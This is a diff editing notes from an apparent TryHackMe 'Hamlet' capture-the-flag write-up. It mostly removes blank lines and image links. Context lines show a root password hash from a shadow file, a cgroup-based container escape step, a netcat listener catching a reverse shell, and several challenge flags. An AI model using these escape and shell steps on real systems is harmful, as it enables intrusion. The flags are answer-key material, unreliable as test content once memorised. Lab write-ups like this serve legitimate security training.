@@ -309,7 +309,6 @@ ftp> dir
 -rw-r--r--    1 0        0            1425 Sep 15  2021 ufw.status
 226 Directory send OK.
 
-
 Welcome to the Hamlet Annotation Project
 
 We are a small group of researchers annotating Shakespeare's Hamlet using WebAnno. This is the version of the play we are currently using.
@@ -557,7 +556,6 @@ root:$y$j9T$.9s2wZRY3hcP/udKIFher1$sIBIYsiMmFlXhKOO4ZDJDXo54byuq7a4xAD0k9jw2m4:1
  Not Found.
 --------------------------------------------------
 
-
 https://security.stackexchange.com/questions/248994/can-anyone-identify-the-y-hash-prefix-or-identify-what-hash-this-could-be
 
 So it turns out that it is a yescrypt hash and isn't supported by hashcat for cracking yet
@@ -600,7 +598,6 @@ THM{5_murder_most_foul}
 root@66505608bd11:~# fdisk
 fdisk
 bash: fdisk: command not found
-
 
 root@66505608bd11:~# ls -la /dev | grep disk
 ls -la /dev | grep disk
@@ -691,7 +688,6 @@ chmod a+x /cmd
 root@66505608bd11:~# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ rlwrap nc -lvnp 1338                                     
 listening on [any] 1338 ...
@@ -714,9 +710,6 @@ drwx------  2 root root 4.0K Sep 15  2021 .ssh
 THM{6_though_this_be_madness_yet_there_is_method_in_t}
 
 ```
-
-![[Pasted image 20230804211044.png]]
-![[Pasted image 20230804211657.png]]
 
 What is Michael's password?
 
@@ -747,6 +740,5 @@ Flag 5
 Flag 6
 
 *THM{6_though_this_be_madness_yet_there_is_method_in_t}*
-
 
 [[Forgotten Implant]]
